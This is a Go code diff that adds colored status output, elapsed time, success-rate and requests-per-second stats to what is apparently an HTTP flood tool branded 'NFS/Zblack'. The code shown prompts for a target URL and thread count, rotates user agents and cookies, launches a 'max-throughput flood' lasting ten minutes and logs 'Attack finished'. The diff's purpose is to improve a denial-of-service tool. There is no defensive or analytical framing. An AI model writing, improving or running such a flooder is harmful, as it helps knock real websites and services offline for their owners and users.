@@ -19,6 +19,7 @@ import (
 
 	"unicode/utf8"
 
+	"github.com/fatih/color"
 	"github.com/sirupsen/logrus"
 	"golang.org/x/term"
 )
@@ -35,6 +36,16 @@ var (
 	cookiePool    []string
 	uaPool        []string
 	verboseMode   bool
+	startTime     time.Time
+)
+
+// Color functions
+var (
+	colorGreen   = color.New(color.FgGreen, color.Bold).SprintFunc()
+	colorRed     = color.New(color.FgRed, color.Bold).SprintFunc()
+	colorYellow  = color.New(color.FgYellow, color.Bold).SprintFunc()
+	colorCyan    = color.New(color.FgCyan, color.Bold).SprintFunc()
+	colorMagenta = color.New(color.FgMagenta, color.Bold).SprintFunc()
 )
 
 func initPools(ua []string) {
@@ -197,10 +208,16 @@ func monitorProgress(ctx context.Context, log *logrus.Logger, stats *requestStat
 		select {
 		case <-ctx.Done():
 			totalSuccess, totalFailure := stats.load()
+			totalRequests := totalSuccess + totalFailure
+			elapsed := time.Since(startTime)
+			avgRPS := float64(totalRequests) / elapsed.Seconds()
+			
 			log.WithFields(logrus.Fields{
 				"success_total":  totalSuccess,
 				"failure_total":  totalFailure,
-				"requests_total": totalSuccess + totalFailure,
+				"requests_total": totalRequests,
+				"elapsed":        elapsed.String(),
+				"avg_rps":        fmt.Sprintf("%.2f", avgRPS),
 			}).Info("Monitor stopped")
 			return
 		case <-ticker.C:
@@ -209,22 +226,50 @@ func monitorProgress(ctx context.Context, log *logrus.Logger, stats *requestStat
 			deltaF := totalFailure - prevFailure
 			prevSuccess, prevFailure = totalSuccess, totalFailure
 
+			totalRequests := totalSuccess + totalFailure
+			elapsed := time.Since(startTime)
+			successRate := float64(0)
+			if totalRequests > 0 {
+				successRate = float64(totalSuccess) / float64(totalRequests) * 100
+			}
+
 			if deltaS == 0 && deltaF == 0 {
 				if verboseMode {
-					// In verbose mode, always log even if zero activity
-					log.WithFields(logrus.Fields{
-						"success_rps":  deltaS,
-						"failure_rps":  deltaF,
-						"requests_rps": deltaS + deltaF,
-					}).Info("Throughput")
+					log.Printf("[%s] %s | %s: %d | %s: %d | %s: %d | %s: %.2f%% | ⏱️  %s",
+						time.Now().Format("15:04:05"),
+						colorCyan("MONITOR"),
+						colorGreen("✓"),
+						totalSuccess,
+						colorRed("✗"),
+						totalFailure,
+						colorMagenta("Req/s"),
+						deltaS+deltaF,
+						colorYellow("Success Rate"),
+						successRate,
+						elapsed.String(),
+					)
 				}
 				continue
 			}
-			log.WithFields(logrus.Fields{
-				"success_rps":  deltaS,
-				"failure_rps":  deltaF,
-				"requests_rps": deltaS + deltaF,
-			}).Info("Throughput")
+			
+			rpsColor := colorGreen
+			if deltaS+deltaF < 100 {
+				rpsColor = colorYellow
+			}
+
+			log.Printf("[%s] %s | %s: %d | %s: %d | %s: %s | %s: %.2f%% | ⏱️  %s",
+				time.Now().Format("15:04:05"),
+				colorCyan("MONITOR"),
+				colorGreen("✓"),
+				totalSuccess,
+				colorRed("✗"),
+				totalFailure,
+				colorMagenta("Req/s"),
+				rpsColor(deltaS+deltaF),
+				colorYellow("Success Rate"),
+				successRate,
+				elapsed.String(),
+			)
 		}
 	}
 }
@@ -262,11 +307,27 @@ func workerPool(ctx context.Context, numWorkers int, targetURL string, log *logr
 	cancel()
 
 	totalS, totalF := stats.load()
-	log.WithFields(logrus.Fields{
-		"success_total":  totalS,
-		"failure_total":  totalF,
-		"requests_total": totalS + totalF,
-	}).Info("All workers done")
+	elapsed := time.Since(startTime)
+	avgRPS := float64(totalS+totalF) / elapsed.Seconds()
+	successRate := float64(0)
+	if totalS+totalF > 0 {
+		successRate = float64(totalS) / float64(totalS+totalF) * 100
+	}
+
+	log.Printf("[%s] %s | %s: %d | %s: %d | %s: %d | %s: %.2f%% | %s: %.2f req/s",
+		time.Now().Format("15:04:05"),
+		colorMagenta("COMPLETE"),
+		colorGreen("✓"),
+		totalS,
+		colorRed("✗"),
+		totalF,
+		colorMagenta("Total"),
+		totalS+totalF,
+		colorYellow("Success Rate"),
+		successRate,
+		colorCyan("Avg RPS"),
+		avgRPS,
+	)
 }
 
 // ---------- Helpers (unchanged from original) ----------
@@ -337,8 +398,8 @@ func (f *ListFormatter) Format(entry *logrus.Entry) ([]byte, error) {
 func main() {
 
 	printBanner()
-	fmt.Println("======+ NSF +======")
-	fmt.Println("====+ Zblack +====")
+	fmt.Println(colorGreen("=====+ NFS +====="))
+	fmt.Println(colorCyan("====+ Zblack +===="))
 	fmt.Println()
 
 	// Parse command-line flags
@@ -351,38 +412,39 @@ func main() {
 	log.SetLevel(logrus.InfoLevel)
 
 	if verboseMode {
-		log.Info("Verbose mode enabled - logs every 2 seconds")
+		log.Info(colorYellow("✓ Verbose mode enabled - logs every 2 seconds"))
 	}
 
-	targetURL := promptUserInput("target URL: ")
+	targetURL := promptUserInput(colorCyan("target URL: "))
 	if targetURL == "" {
-		log.Fatal("masukan url dg benar")
+		log.Fatal(colorRed("✗ masukan url dg benar"))
 	}
 
-	threadsInput := promptUserInput("threads: ")
+	threadsInput := promptUserInput(colorCyan("threads: "))
 	numThreads, err := strconv.Atoi(strings.TrimSpace(threadsInput))
 	if err != nil || numThreads <= 0 {
-		log.Fatal("threads salah")
+		log.Fatal(colorRed("✗ threads salah"))
 	}
 
 	userAgentFile := "user_agents.txt"
 	userAgents, err := loadUserAgents(userAgentFile)
 	if err != nil {
-		log.WithError(err).Fatal("tidak ditemukan file user_agents.txt")
+		log.WithError(err).Fatal(colorRed("✗ tidak ditemukan file user_agents.txt"))
 	}
 	if len(userAgents) == 0 {
-		log.Fatal("user agent list kosong")
+		log.Fatal(colorRed("✗ user agent list kosong"))
 	}
 
 	log.WithFields(logrus.Fields{
 		"url":        targetURL,
 		"threads":    numThreads,
 		"userAgents": len(userAgents),
-	}).Info("Starting max-throughput flood")
+	}).Info(colorGreen("✓ Starting max-throughput flood"))
 
+	startTime = time.Now()
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
 	defer cancel()
 
 	workerPool(ctx, numThreads, targetURL, log, userAgents)
-	log.Info("Attack finished")
+	log.Info(colorGreen("✓ Attack finished"))
 }
